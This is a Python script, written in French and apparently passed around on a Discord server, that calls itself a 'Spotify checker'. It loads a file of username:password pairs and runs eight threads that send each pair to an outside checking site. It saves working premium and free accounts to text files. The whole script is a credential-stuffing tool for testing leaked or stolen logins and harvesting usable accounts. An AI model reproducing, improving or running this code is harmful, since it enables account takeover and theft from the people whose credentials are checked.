import requests
import requests as reqs
from threading import *
from itertools import islice
import sys, os
print("""
  BBBBBBBBBBBBBBBBB                                      lllllll 
B::::::::::::::::B                                     l:::::l 
B::::::BBBBBB:::::B                                    l:::::l 
BB:::::B     B:::::B                                   l:::::l 
  B::::B     B:::::B  aaaaaaaaaaaaa    aaaaaaaaaaaaa    l::::l 
  B::::B     B:::::B  a::::::::::::a   a::::::::::::a   l::::l 
  B::::BBBBBB:::::B   aaaaaaaaa:::::a  aaaaaaaaa:::::a  l::::l 
  B:::::::::::::BB             a::::a           a::::a  l::::l 
  B::::BBBBBB:::::B     aaaaaaa:::::a    aaaaaaa:::::a  l::::l 
  B::::B     B:::::B  aa::::::::::::a  aa::::::::::::a  l::::l 
  B::::B     B:::::B a::::aaaa::::::a a::::aaaa::::::a  l::::l 
  B::::B     B:::::Ba::::a    a:::::aa::::a    a:::::a  l::::l 
BB:::::BBBBBB::::::Ba::::a    a:::::aa::::a    a:::::a l::::::l
B:::::::::::::::::B a:::::aaaa::::::aa:::::aaaa::::::a l::::::l
B::::::::::::::::B   a::::::::::aa:::aa::::::::::aa:::al::::::l
BBBBBBBBBBBBBBBBB     aaaaaaaaaa  aaaa aaaaaaaaaa  aaaallllllll

Spotify checker

""")

check = input("\nCette outil est en cours de développement (ALPHA). \n Voulez vous continuez ? (oui/non | Par défault :oui): ")

if check in ['n', 'N', 'No', 'no', 'NO']:
    sys.exit()

account = input("\nEntrez le chemin des comptes : ")
if not os.path.exists(account):
    sys.exit(f"[!] Fichier '{account}' n'existe pas!.")
elif os.path.getsize(account) == 0:
    sys.exit(f"[!] Fichier '{account}' est vide !.")

premiumac = open("PremiumAccounts.txt", 'w')
freeac = open("FreeAccounts.txt", 'w')

Pno = 0
Fno = 0
Dno = 0
tryno = 0

url = "https://checkz.net/tools/ajax.php"

loaded = len(open(account).readlines())
print ("\n", loaded, " Comptes chargées pour checker....!")

print ("\nStatus	|	Pays	|	Date Expiration |	Username:Password\n")


def result(country, userpass, response):
    global Pno, Fno, Dno, tryno
    if 'Premium' in (response.text):
        Pac = "|Compte premium| Pays:" + country + " | " + userpass
        premiumac.write(Pac)
        # print response.text
        tryno = tryno + 1
        Pno = Pno + 1
        print ("|", tryno, " Compte checké ..! | Premium:", Pno, " | Gratuit: ", Fno, " | Mort: ", Dno)
        print (Pac)
    elif 'Free' in (response.text):
        Fac = "|Compte gratuit | Pays:" + country + " Exp: Null| " + userpass
        freeac.write(Fac)
        tryno = tryno + 1
        Fno = Fno + 1
        print ("|", tryno, " Compte checké ..! | Premium:", Pno, " | Gratuit: ", Fno, " | Mort: ", Dno)
        print (Fac)
    else:
        tryno = tryno + 1
        Dno = Dno + 1
        print ("|", tryno, " Compte checké ..! | Premium:", Pno, " | Gratuit: ", Fno, " | Mort: ", Dno)
        print ("Compte mort | Pays: Null | Expiration: Null | " + userpass)


def checker(userpass):
    form = {
        'checker': 'spotify',
        'mplist': str(userpass),
        'proxylist': '127.0.0.1:80'
    }

    response = reqs.post(url, form, stream=True)
    country = ((response.text).split("Cntry:", 1)[-1]).split("<\/td><td>", 1)[0]
    result(country, userpass, response)


class checker1(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 0, loaded, 8):
                checker(lines)


class checker2(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 1, loaded, 8):
                checker(lines)


class checker3(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 2, loaded, 8):
                checker(lines)


class checker4(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 3, loaded, 8):
                checker(lines)


class checker5(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 4, loaded, 8):
                checker(lines)


class checker6(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 5, loaded, 8):
                checker(lines)


class checker7(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 6, loaded, 8):
                checker(lines)


class checker8(Thread):
    def run(self):
        with open(account) as lines:
            for lines in islice(lines, 7, loaded, 8):
                checker(lines)


workers = [checker1(), checker2(), checker3(), checker4(), checker5(), checker6(), checker7(), checker8()]
for worker in workers:
    worker.start()
for worker in workers:
    worker.join()

print ("\nTotal de compte checkés = ", tryno)
print ("\nLes comptes premiums sont sauvegardés sous forme : PremiumAccounts.txt \nLes comptes gratuits sont sauvegardés sous forme : FreeAccounts.txt")
print ("\ndiscord.gg/rowsfield")
